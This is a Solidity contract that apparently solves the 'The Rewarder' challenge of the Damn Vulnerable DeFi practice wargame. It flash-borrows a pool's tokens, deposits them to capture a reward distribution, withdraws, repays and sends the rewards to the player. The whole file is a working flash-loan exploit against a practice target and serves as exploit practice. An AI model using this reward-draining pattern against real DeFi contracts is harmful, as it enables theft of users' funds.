// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import { AccountingToken } from "./AccountingToken.sol";
import { RewardToken } from "./RewardToken.sol";
import "./TheRewarderPool.sol";

contract AttackR {
    address player;
    TheRewarderPool Rpool;
    FlashLoanerPool FLpool;
    DamnValuableToken DVT;
    RewardToken RT;

    constructor (address _player, address _Rpool, address _FLpool, address _DVT, address _RT) {
        player = _player;
        Rpool = TheRewarderPool(_Rpool);
        FLpool = FlashLoanerPool(_FLpool);
        DVT = DamnValuableToken(_DVT);
        RT = RewardToken(_RT);
    }

    function kek() public {
        FLpool.flashLoan(DVT.balanceOf(address(FLpool)));
    }

    function receiveFlashLoan(uint256 amount) public {
        DVT.approve(address(Rpool),amount);
        Rpool.deposit(amount);
        Rpool.distributeRewards();
        Rpool.withdraw(amount);
        DVT.transfer(address(FLpool), amount);
        RT.transfer(player, RT.balanceOf(address(this)));
    }
}